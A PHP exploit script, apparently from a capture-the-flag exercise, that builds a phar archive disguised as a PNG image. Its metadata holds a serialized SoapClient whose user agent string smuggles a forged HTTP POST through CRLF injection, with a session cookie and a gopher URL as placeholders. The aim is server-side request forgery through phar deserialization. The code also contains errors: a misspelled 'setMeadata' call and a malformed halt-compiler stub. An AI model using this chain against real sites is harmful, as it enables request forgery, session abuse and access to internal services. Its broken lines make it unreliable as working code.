<?php
class ImageModel
{
	public $file;
	public function __construct($file)
	{
		$this->file = new SoapClient(null, array(
			"location" => "http://localhost:80/proxy",
			"uri" => "http://localhost:80/proxy",
			"user_agent" => "clrf-inject\r\n\r\n\r\n\r\n".
				"POST /proxy HTTP/1.1\r\n".
				"HOST: HOST\r\n".
				"Connection: close\r\n".
				"Cookie: PHPSESSID=SESSION\r\n".
				"Content-Type: application/x-www-form-urlencoded\r\n".
				"Content-Length: LEN(url=GOPHER)\r\n\r\n".
				"url=Gopher".
				"\r\n\r\n\r\n"
		));
	}
}
@unlink('payload.phar');
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFile('test.png', 'test.png');
$phar->setStub(file_get_contents('test.png'). ' __HALT_COMPILER(): ?>');
$phar->setMeadata(new ImageModel('none'));
$phar->stopBuffering();
system('mv payload.phar payload.png');